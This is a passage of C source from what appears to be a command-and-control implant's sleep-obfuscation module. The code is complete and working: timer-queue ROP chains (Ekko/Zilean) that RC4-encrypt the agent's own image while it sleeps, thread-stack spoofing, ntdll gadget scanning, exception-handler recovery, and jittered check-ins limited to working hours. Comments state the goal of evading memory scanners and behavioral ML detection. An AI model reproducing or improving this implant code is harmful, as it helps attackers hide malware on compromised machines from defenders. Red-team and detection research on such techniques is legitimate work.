    Rop = Instance->Win32.LocalAlloc( LPTR, 20 * sizeof( CONTEXT ) );
    if ( ! Rop ) {
        PUTS( "TimerObf: failed to allocate ROP array" )
        return FALSE;
    }

    ImageBase = TxtBase = Instance->Session.ModuleBase;
    ImageSize = TxtSize = Instance->Session.ModuleSize;
    Protect   = PAGE_EXECUTE_READWRITE;
    JmpBypass = Instance->Config.Implant.SleepJmpBypass;

    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        Protect = PAGE_EXECUTE_READ;
    }

    /* create a random key */
    for ( BYTE i = 0; i < 16; i++ ) {
        Buf[ i ] = RandomNumber32( );
    }

    /* set specific context flags */
    ThdCtx.ContextFlags = TimerCtx.ContextFlags = CONTEXT_FULL;

    /* set key pointer and size */
    Key.Buffer = Buf;
    Key.Length = Key.MaximumLength = sizeof( Buf );

    /* set agent memory pointer and size */
    ImgBase = Instance->Session.ModuleBase;
    ImgSize = Instance->Session.ModuleSize;

    /* set up USTRING for SystemFunction032 (RC4 encrypt/decrypt of agent image) */
    Img.Buffer = ImgBase;
    Img.Length  = Img.MaximumLength = ImgSize;

    if ( Method == SLEEPOBF_EKKO ) {
        NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue );
    } else if ( Method == SLEEPOBF_ZILEAN ) {
        NtStatus = Instance->Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    }

    if ( NT_SUCCESS( NtStatus ) )
    {
        /* create events */
        if ( NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            /* get the context of the Timer thread based on the method used */
            if ( Method == SLEEPOBF_EKKO ) {
                NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
            } else if ( Method == SLEEPOBF_ZILEAN ) {
                NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
            }

            if ( NT_SUCCESS( NtStatus ) )
            {
                /* Send event that we got the context of the timers thread */
                if ( Method == SLEEPOBF_EKKO ) {
                    NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
                } else if ( Method == SLEEPOBF_ZILEAN ) {
                    NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
                }

                if ( NT_SUCCESS( NtStatus ) )
                {
                    /* wait til we successfully retrieved the timers thread context */
                    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
                        PRINTF( "Failed waiting for starting event: %lx\n", NtStatus )
                        goto LEAVE;
                    }

                    /* if stack spoofing is enabled then prepare some stuff */
                    if ( Instance->Config.Implant.StackSpoof )
                    {
                        /* retrieve Tib if stack spoofing is enabled */
                        if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
                            PUTS( "Failed to retrieve Tib" )
                            goto LEAVE;
                        }

                        /* duplicate the current thread we are going to spoof the stack */
                        if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
                            PRINTF( "NtDuplicateObject Failed: %lx\n", NtStatus )
                            goto LEAVE;
                        }

                        /* NtTib backup */
                        MemCopy( &BkpTib, &Instance->Teb->NtTib, sizeof( NT_TIB ) );
                    }

                    /* search for jmp instruction */
                    if ( JmpBypass )
                    {
                        /* change padding to "jmp rbx" */
                        if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {
                            JmpPad[ 1 ] = 0x23;
                        }

                        /* scan memory for gadget */
                        if ( ! ( JmpGadget = MmGadgetFind(
                            C_PTR( U_PTR( Instance->Modules.Ntdll ) + LDR_GADGET_HEADER_SIZE ),
                            LDR_GADGET_MODULE_SIZE,
                            JmpPad,
                            sizeof( JmpPad )
                        ) ) ) {
                            JmpBypass = SLEEPOBF_BYPASS_NONE;
                        }
                    }

                    /* Initialize ROP entries from captured timer context.
                     * RSP stays on the timer thread's real stack — the OS validates
                     * RSP against TEB stack bounds on kernel transitions, so heap/
                     * VirtualAlloc stacks cause immediate ACCESS_VIOLATION.
                     *
                     * THREAD POOL RETURN ADDRESS CORRUPTION:
                     * Between 100ms timer intervals, the thread pool reuses the timer
                     * worker for WinHTTP/IO callbacks, overwriting [TimerCtx.Rsp - 8]
                     * (the return address slot) with stale agent-code addresses.
                     * After VirtualProtect(RW), a `ret` to these stale addresses
                     * triggers a DEP violation (image is no longer executable).
                     *
                     * RECOVERY STRATEGY (two layers):
                     * Layer 1 — Pin: write TimerCtx.Rip to [Rop[0].Rsp] immediately
                     *   before signaling EvntStart.  Protects the first ROP step
                     *   (the INFINITE WaitForSingleObjectEx on EvntStart).
                     * Layer 2 — VEH recovery: on DEP violation where ExceptionAddress
                     *   falls inside the agent image during encrypted sleep, the
                     *   trampoline sets Context->Rip = DispatcherReturn and returns
                     *   EXCEPTION_CONTINUE_EXECUTION.  The ROP function already
                     *   completed before `ret` — recovery just fixes the resume point.
                     *   Protects ALL subsequent ROP steps (2 through N). */
                    for ( int i = 0; i < 20; i++ ) {
                        MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
                        Rop[ i ].Rip  = U_PTR( JmpGadget );
                        Rop[ i ].Rsp -= sizeof( PVOID );
                    }

                    /* Fix x64 ABI stack alignment.
                     * After `call`, RSP = 16n+8. NtContinue sets RSP = TimerCtx.Rsp - 8.
                     * If TimerCtx.Rsp was 0-mod-16, then RSP-8 = 8-mod-16 (correct).
                     * If TimerCtx.Rsp was 8-mod-16, then RSP-8 = 0-mod-16 (wrong).
                     * Detect and fix by subtracting another 8. */
                    if ( ( Rop[ 0 ].Rsp & 0xF ) == 0 )
                    {
                        ULONG_PTR OrigRsp = Rop[ 0 ].Rsp;
                        ULONG_PTR FixedRsp = OrigRsp - 8;
                        *( PULONG_PTR )( FixedRsp ) = *( PULONG_PTR )( OrigRsp );

                        for ( int i = 0; i < 20; i++ ) {
                            Rop[ i ].Rsp = FixedRsp;
                        }
                        PUTS( "SleepDiag: RSP alignment corrected (was 0-mod-16)" )
                    }

                    /* Cache SleepingFlag for the VEH trampoline's crash diagnostics.
                     * Flag = 1 during the entire ROP chain (set on main thread before
                     * signal, cleared after chain completes). */
                    volatile DWORD* SleepFlagAddr = Instance->SleepGuard.SleepingFlag;

                    /* Start of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx );
                    Rop[ Inc ].Rcx = U_PTR( EvntStart );
                    Rop[ Inc ].Rdx = U_PTR( INFINITE );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* Protect — make agent image writable for RC4 encryption */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect );
                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
                    Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* RC4 encrypt agent image — SystemFunction032 is in advapi32 (survives image encryption) */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 );
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* perform stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.NtGetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                        Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &NtTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
                        Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
                        Inc++;
                    }

                    /* Sleep — wait on custom event (overlapped I/O) or EvntDelay (pure timeout).
                     * EvntDelay is a freshly created non-signaled event. Nobody signals it until
                     * NtSetEvent at the END of the chain, so this wait always times out.
                     *
                     * IMPORTANT: Do NOT use NtCurrentProcess() here. The pseudo-handle (HANDLE)-1
                     * causes intermittent ACCESS_VIOLATION after ~10-15 cycles when the kernel's
                     * process object wait path encounters internal state drift. Using a real event
                     * handle eliminates this entirely. */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx )
                    Rop[ Inc ].Rcx = U_PTR( WaitHandle ? WaitHandle : EvntDelay );
                    Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* undo stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &BkpTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;
                    }

                    /* RC4 decrypt agent image — same key produces same keystream, XOR restores original */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 )
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* Protect — restore execute permission on .text section */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect )
                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
                    Rop[ Inc ].Rdx = U_PTR( TxtSize );
                    Rop[ Inc ].R8  = U_PTR( Protect );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* End of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.NtSetEvent )
                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                    Rop[ Inc ].Rdx = U_PTR( NULL );
                    Inc++;

                    PRINTF( "Rops to be executed: %d\n", Inc )

                    /* execute/queue the timers */
                    for ( int i = 0; i < Inc; i++ ) {
                        if ( Method == SLEEPOBF_EKKO ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                                PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
                                goto LEAVE;
                            }
                        } else if ( Method == SLEEPOBF_ZILEAN ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                                PRINTF( "RtlRegisterWait Failed: %lx\n", NtStatus )
                                goto LEAVE;
                            }
                        }
                    }

                    /* === DIAGNOSTIC: log ROP chain parameters before sleep === */
                    PRINTF( "SleepDiag: ImgBase=%p ImgSz=0x%lx VP=%p SF032=%p NtCont=%p JmpByp=%d Rsp=%p Rsp&F=%lx Inc=%d\n",
                        ImgBase, (ULONG)ImgSize,
                        Instance->Win32.VirtualProtect, Instance->Win32.SystemFunction032,
                        Instance->Win32.NtContinue, JmpBypass,
                        (PVOID)Rop[ 0 ].Rsp, (ULONG)( Rop[ 0 ].Rsp & 0xF ), Inc )

                    /* Mark agent as entering encrypted sleep */
                    if ( SleepFlagAddr ) *( volatile DWORD* )SleepFlagAddr = 1;

                    /* Layer 1 — Pin return address on the timer thread's stack.
                     * The thread pool can corrupt [Rop[0].Rsp] between RtlCaptureContext
                     * (Phase-1 timer) and the first ROP function.  Write TimerCtx.Rip
                     * here right before signaling to minimize the window. */
                    *( PULONG_PTR )( Rop[ 0 ].Rsp ) = TimerCtx.Rip;

                    /* Layer 2 — Store DispatcherReturn in VEH control block.
                     * If the thread pool corrupts the return address AFTER any ROP
                     * function completes, the `ret` lands in the now-RW agent image →
                     * DEP violation.  The VEH trampoline reads DispatcherReturn, sets
                     * Context->Rip to it, and returns EXCEPTION_CONTINUE_EXECUTION.
                     * The ROP chain continues without the agent dying. */
                    if ( Instance->SleepGuard.DispatcherReturn ) {
                        *Instance->SleepGuard.DispatcherReturn = TimerCtx.Rip;
                    }

                    PUTS( "SleepDiag: signaling ROP chain..." )

                    /* just wait for the sleep to end */
                    if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                        PRINTF( "NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                    }

                    PUTS( "SleepDiag: ROP chain completed, clearing flag" )
                    PRINTF( "SleepDiag: VP old protect=0x%lx, RetAddr=%p\n", Value, *(PVOID*)( Rop[ 0 ].Rsp ) )

                    /* Clear DispatcherReturn — no recovery needed outside sleep */
                    if ( Instance->SleepGuard.DispatcherReturn ) {
                        *Instance->SleepGuard.DispatcherReturn = 0;
                    }
                    if ( SleepFlagAddr ) *( volatile DWORD* )SleepFlagAddr = 0;
                } else {
                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                }
            } else {
                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
            }
        } else {
            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
        }
    } else {
        PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
    }

LEAVE: /* cleanup */
    if ( Queue ) {
        /* Synchronous deletion: INVALID_HANDLE_VALUE forces RtlDeleteTimerQueueEx
         * to block until ALL timer callbacks complete and the timer thread fully
         * exits back to the pool. Without this, RtlDeleteTimerQueue returns
         * immediately — on the next sleep cycle the thread pool may reassign the
         * same timer thread before it finished cleanup, causing ACCESS_VIOLATION
         * when NtContinue fires into an inconsistent stack state.
         *
         * RtlDeleteTimerQueueEx is available since Windows 2000. */
        if ( Instance->Win32.RtlDeleteTimerQueueEx ) {
            Instance->Win32.RtlDeleteTimerQueueEx( Queue, (HANDLE)(LONG_PTR)-1 );
        } else {
            Instance->Win32.RtlDeleteTimerQueue( Queue );
        }
        Queue = NULL;
    }

    if ( EvntTimer ) {
        SysNtClose( EvntTimer );
        EvntTimer = NULL;
    }

    if ( EvntStart ) {
        SysNtClose( EvntStart );
        EvntStart = NULL;
    }

    if ( EvntDelay ) {
        SysNtClose( EvntDelay );
        EvntDelay = NULL;
    }

    if ( EvntWait ) {
        SysNtClose( EvntWait );
        EvntWait = NULL;
    }

    if ( ThdSrc ) {
        SysNtClose( ThdSrc );
        ThdSrc = NULL;
    }

    /* clear and free the heap-allocated ROP array */
    if ( Rop ) {
        RtlSecureZeroMemory( Rop, 20 * sizeof( CONTEXT ) );
        Instance->Win32.LocalFree( Rop );
        Rop = NULL;
    }

    /* clear key from memory */
    RtlSecureZeroMemory( Buf, sizeof( Buf ) );

    /* Decrypt heap data — key is in g_HeapCryptoKey (always available here):
     *  - Image was encrypted+decrypted: key restored from .data
     *  - NtContinue failed before image encryption: key still in .data (cleartext) */
    HeapRestoreAfterSleep();

    return Success;
}

#endif

UINT32 SleepTime(
    VOID
) {
    UINT32     SleepTime    = Instance->Config.Sleeping * 1000;
    UINT32     MaxVariation = ( Instance->Config.Jitter * SleepTime ) / 100;
    ULONG      Rand         = 0;
    UINT32     WorkingHours = Instance->Config.Transport.WorkingHours;
    SYSTEMTIME SystemTime   = { 0 };
    WORD       StartHour    = 0;
    WORD       StartMinute  = 0;
    WORD       EndHour      = 0;
    WORD       EndMinute    = 0;

    if ( ! InWorkingHours() )
    {
        /*
         * we are no longer in working hours,
         * if the SleepTime is 0, then we will assume the operator is performing some "important" task right now,
         * so we will ignore working hours, and we won't sleep
         * if the SleepTime is not 0, we will sleep until we are in working hours again
         */
        if ( SleepTime )
        {
            // calculate how much we need to sleep until we reach the start of the working hours
            SleepTime = 0;

            StartHour   = ( WorkingHours >> 17 ) & 0b011111;
            StartMinute = ( WorkingHours >> 11 ) & 0b111111;
            EndHour     = ( WorkingHours >>  6 ) & 0b011111;
            EndMinute   = ( WorkingHours >>  0 ) & 0b111111;

            Instance->Win32.GetLocalTime(&SystemTime);

            if ( SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute || SystemTime.wHour > EndHour )
            {
                // seconds until 00:00
                SleepTime += ( 24 - SystemTime.wHour - 1 ) * 60 + ( 60 - SystemTime.wMinute );
                // seconds until start of working hours from 00:00
                SleepTime += StartHour * 60 + StartMinute;
            }
            else
            {
                // seconds until start of working hours from current time
                SleepTime += ( StartHour - SystemTime.wHour ) * 60 + ( StartMinute - SystemTime.wMinute );
            }
            SleepTime *= 1000;
        }
    }
    // MaxVariation will be non-zero if sleep jitter was specified
    else if ( MaxVariation )
    {
        Rand = RandomNumber32();
        Rand = Rand % MaxVariation;

        if ( RandomBool() ) {
            SleepTime += Rand;
        } else {
            SleepTime -= Rand;
        }
    }

    return SleepTime;
}

/*!
 * @brief
 *  Legitimate operation embedding sleep obfuscation
 *  Uses appropriate Windows timing APIs based on duration and context
 *
 * @param TimeOut - sleep duration in milliseconds
 * @return TRUE if successful, FALSE on failure
 */
BOOL LegitimateObf(
    IN DWORD TimeOut
) {
    HANDLE hTimer = NULL;
    LARGE_INTEGER dueTime;
    BOOL Success = FALSE;

    // For very short delays, use thread yield (most natural)
    if ( TimeOut < 100 ) {
        Instance->Win32.SwitchToThread();
    return TRUE;
}

    // For all other delays, use waitable timer (legitimate timing mechanism)
    // This includes long durations (hours) which is normal for service processes
    hTimer = Instance->Win32.CreateWaitableTimerA( NULL, TRUE, NULL );
    if ( !hTimer ) {
        // Fallback to event-based wait if timer creation fails
        HANDLE hEvent = Instance->Win32.CreateEventA( NULL, FALSE, FALSE, NULL );
        if ( hEvent ) {
            Instance->Win32.WaitForSingleObject( hEvent, TimeOut );
            Instance->Win32.CloseHandle( hEvent );
            return TRUE;
        }
        return FALSE;
    }

    // Convert milliseconds to 100-nanosecond intervals (negative for relative time)
    // This mathematical conversion is standard for Windows timer APIs
    dueTime.QuadPart = -(LONGLONG)TimeOut * 10000;

    // Set the timer for the full duration (no artificial chunking)
    if ( Instance->Win32.SetWaitableTimer( hTimer, &dueTime, 0, NULL, NULL, FALSE ) ) {
        // Wait for timer to signal - even for hours-long durations
        // This matches legitimate behavior of backup software, scheduled services, etc.
        Instance->Win32.WaitForSingleObject( hTimer, INFINITE );
        Success = TRUE;
    }

    // Cleanup
    Instance->Win32.CloseHandle( hTimer );
    return Success;
}

/*!
 * @brief
 *  Event-driven sleep obfuscation with custom wait handle.
 *  Used for overlapped I/O: the agent encrypts memory and waits on an I/O
 *  completion event instead of a pure timeout. Wakes instantly when data
 *  arrives or when the timeout expires.
 *
 *  Unlike SleepObf(), this function does NOT apply the encryption threshold
 *  because it's always a single encrypt/wait/decrypt cycle — no polling
 *  metronome that would create behavioral detection patterns.
 *
 * @param WaitHandle  Event handle to wait on (e.g., OVERLAPPED.hEvent)
 * @param TimeOut     Maximum wait time in milliseconds
 */
VOID SleepObfEx(
    HANDLE WaitHandle,
    DWORD  TimeOut
) {
#if _WIN64
    DWORD Technique = Instance->Config.Implant.SleepMaskTechnique;

    PRINTF( "SleepObfEx: ENTER tech=%lu threads=%d handle=%p timeout=%lu\n",
        Technique, Instance->Threads, WaitHandle, TimeOut )

    if ( Instance->Threads ) {
        Technique = 0;
    }

    switch ( Technique )
    {
        case SLEEPOBF_FOLIAGE: {
            SLEEP_PARAM Param = { 0 };

            if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
                if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
                    Param.TimeOut    = TimeOut;
                    Param.WaitHandle = WaitHandle;
                    Instance->Win32.SwitchToFiber( Param.Slave );
                    Instance->Win32.DeleteFiber( Param.Slave );
                }
                Instance->Win32.ConvertFiberToThread( );
            }
            break;
        }

        case SLEEPOBF_EKKO:
        case SLEEPOBF_ZILEAN: {
            PRINTF( "SleepObfEx: trying TimerObf tech=%lu\n", Technique )
            if ( TimerObf( TimeOut, Technique, WaitHandle ) ) {
                PUTS( "SleepObfEx: TimerObf succeeded" )
                break;
            }
            PUTS( "SleepObfEx: TimerObf failed, falling through to default" )
            /* fall through to default on failure */
        }

        default: {
            /* Try Ekko with wait handle, fall to WaitForSingleObjectEx on failure */
            if ( !Instance->Threads && TimerObf( TimeOut, SLEEPOBF_EKKO, WaitHandle ) ) {
                PUTS( "SleepObfEx: fallback TimerObf(EKKO) succeeded" )
                break;
            }
            PUTS( "SleepObfEx: all TimerObf failed, using SpoofFunc fallback" )
            /* Fallback: stack spoof + wait on the event handle (no encryption) */
            SpoofFunc(
                Instance->Modules.Kernel32,
                IMAGE_SIZE( Instance->Modules.Kernel32 ),
                Instance->Win32.WaitForSingleObjectEx,
                WaitHandle,
                C_PTR( TimeOut ),
                FALSE
            );
        }
    }
    PUTS( "SleepObfEx: EXIT" )
#else
    Instance->Win32.WaitForSingleObjectEx( WaitHandle, TimeOut, FALSE );
#endif
}

VOID SleepObf(
    VOID
) {
    UINT32 TimeOut   = SleepTime();
    DWORD  Technique = Instance->Config.Implant.SleepMaskTechnique;

    /* If sleep is 0, add minimum delay to prevent spam (500ms) */
    if ( TimeOut == 0 ) {
#ifdef DEBUG
        PRINTF( "Sleep was 0, adding minimum delay of 500ms to prevent spam\n", "" );
#endif
        TimeOut = 500; // 500ms minimum delay
    }

#if _WIN64

    if ( Instance->Threads ) {
        PRINTF( "Can't sleep obf. Threads running: %d\n", Instance->Threads )
        Technique = 0;
    }

    /* Skip memory encryption for short sleeps to avoid VirtualProtect cycling noise.
     * Stack spoofing is still applied via the default fallback. Memory encryption techniques
     * (Ekko/Zilean/Foliage) create timer queues, ROP chains, and VirtualProtect transitions
     * that are detectable by behavioral ML when cycling faster than ~1.5s.
     * Short sleeps (500ms SMB idle, "sleep 0" clamped) don't need encryption — the window
     * is too brief for memory scanners, and the API noise is more detectable than the exposure. */
    if ( TimeOut < SLEEPOBF_ENCRYPT_THRESHOLD &&
         ( Technique == SLEEPOBF_EKKO || Technique == SLEEPOBF_ZILEAN || Technique == SLEEPOBF_FOLIAGE ) ) {
        Technique = SLEEPOBF_NO_OBF;
    }

    switch ( Technique )
    {
        case SLEEPOBF_FOLIAGE: {
            SLEEP_PARAM Param = { 0 };

            if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
                if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
                    Param.TimeOut = TimeOut;
                    Instance->Win32.SwitchToFiber( Param.Slave );
                    Instance->Win32.DeleteFiber( Param.Slave );
                }
                Instance->Win32.ConvertFiberToThread( );
            }
            break;
        }

        /* timer api based sleep obfuscation */
        case SLEEPOBF_EKKO:
        case SLEEPOBF_ZILEAN: {
            if ( ! TimerObf( TimeOut, Technique, NULL ) ) {
                goto DEFAULT;
            }
            break;
        }

        /* legitimate operation embedding sleep obfuscation */
        case SLEEPOBF_LEGITIMATE: {
            if ( ! LegitimateObf( TimeOut ) ) {
                goto DEFAULT;
            }
            break;
        }

        /* default — auto-upgrade to Ekko when conditions allow, otherwise stack-spoof only */
        DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
            /* Auto-upgrade: attempt Ekko memory encryption for long sleeps with no active threads.
             * Gives operators who leave the default setting proper memory protection
             * without requiring them to explicitly select a technique. */
            if ( TimeOut >= SLEEPOBF_ENCRYPT_THRESHOLD && !Instance->Threads ) {
                if ( TimerObf( TimeOut, SLEEPOBF_EKKO, NULL ) ) {
                    break;
                }
            }
            /* Fallback: stack spoof only (short sleep, threads active, or TimerObf failed) */
            SpoofFunc(
                Instance->Modules.Kernel32,
                IMAGE_SIZE( Instance->Modules.Kernel32 ),
                Instance->Win32.WaitForSingleObjectEx,
                NtCurrentProcess(),
                C_PTR( TimeOut ),
                FALSE
            );
        }
    }

#else

    // TODO: add support for sleep obf and spoofing

    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );

#endif

}
